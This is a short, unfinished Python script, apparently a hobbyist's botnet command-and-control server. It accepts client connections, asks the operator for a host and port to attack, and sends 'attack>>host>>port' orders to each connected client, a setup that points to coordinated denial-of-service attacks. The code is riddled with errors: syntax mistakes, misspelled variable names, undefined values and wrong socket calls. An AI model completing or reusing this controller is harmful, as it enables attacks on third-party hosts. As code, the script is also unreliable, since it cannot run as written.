###########################################################################
# MM          MM            HH      HH                  CCCCCCC  EEEEEEEE #
# MMMMM     MMMM  rr  rr    HH      HH     ssss        C         E        #
# MM  MM  MM  MM  rrrr  rr  HHHHHHHHHH  ss            C          EEEEEEEE #
# MM    MM    MM  rrr       HHHHHHHHHH    s           C          EEEEEEEE #
# MM          MM  rr        HH      HH     s  ss       C         E        #
# MM          MM  rr        HH      HH  sssss           CCCCCCC  EEEEEEEE #
###########################################################################
##                        Written in python 3.3
'''Program number: 58 Date: 9/3/2013 DtD: 1065 Copyright:(c)MrHs 2013'''

import socket

#(***** Constants *****

host=socket.gethostbyname()
port=1373
#*********************)
address=socket.getaddrinfo(host,port)
mainSocket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
mainSocket.bind(address)
mainSocket.listen(5)

#(**************************
clientList=[]  #A list of address of all clients


#Thread 1
def reciever(mainSocket):
    clientList=[]
    mainSocket.listen(5)
    while 1:
        client,addr=mainSocket.accept()
        if not (client,addr) in clientList:
            if client==mianSocket:
            break
            clientList.append() 
    if stop:
        attackHost=input("Please enter the host name you wanna attack :")
        port=input("PLease insert the attack port or leave for default :")
        if port="":
            port =80
        else:
            port=int(port)
        return alientList,host,port
#Thread 2
def stopper():
    global address
    if input("Do you wanna stop ?"):
        stopsock=socket.socket()
        stopsock.connect(address)
    




#**************************)


def attacker(mainSocket,clientList,host,port):
    for i in alienList:
        attack="attack>>"+str(host)+">>"+str(port)
        i[0].sendall(attack.encode())
        



#Comment :
